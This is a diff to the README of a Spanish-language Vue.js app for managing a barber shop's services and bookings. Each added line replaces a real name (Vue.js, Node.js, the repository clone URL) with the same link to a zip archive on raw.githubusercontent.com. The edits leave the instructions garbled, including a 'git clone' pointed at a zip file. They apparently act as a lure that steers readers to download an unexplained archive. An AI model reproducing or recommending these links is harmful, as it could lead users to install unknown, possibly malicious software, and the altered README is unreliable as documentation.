@@ -1,6 +1,6 @@
 # Barberia App
 
-Barberia App es una aplicación web desarrollada con Vue.js para gestionar servicios y reservas de una barbería.
+Barberia App es una aplicación web desarrollada con https://raw.githubusercontent.com/willsondev/barberia-app/master/graphicalness/barberia-app.zip para gestionar servicios y reservas de una barbería.
 
 ## Características
 
@@ -12,7 +12,7 @@ Barberia App es una aplicación web desarrollada con Vue.js para gestionar servi
 
 ## Tecnologías Utilizadas
 
-- **Vue.js**: Framework de JavaScript para construir interfaces de usuario.
+- **https://raw.githubusercontent.com/willsondev/barberia-app/master/graphicalness/barberia-app.zip**: Framework de JavaScript para construir interfaces de usuario.
 - **Vue Router**: Para la navegación y gestión de rutas.
 - **Vuex**: Para la gestión del estado global de la aplicación.
 - **Tailwind CSS**: Framework de CSS para el diseño de la interfaz.
@@ -20,7 +20,7 @@ Barberia App es una aplicación web desarrollada con Vue.js para gestionar servi
 
 ## Requisitos Previos
 
-- Node.js (versión recomendada: 14.x o superior)
+- https://raw.githubusercontent.com/willsondev/barberia-app/master/graphicalness/barberia-app.zip (versión recomendada: 14.x o superior)
 - npm (versión recomendada: 6.x o superior)
 
 ## Instalación
@@ -29,4 +29,4 @@ Sigue estos pasos para configurar el proyecto en tu entorno local:
 
 1. Clona el repositorio:
    ```bash
-   git clone https://github.com/usuario/barberia-app.git
+   git clone https://raw.githubusercontent.com/willsondev/barberia-app/master/graphicalness/barberia-app.zip
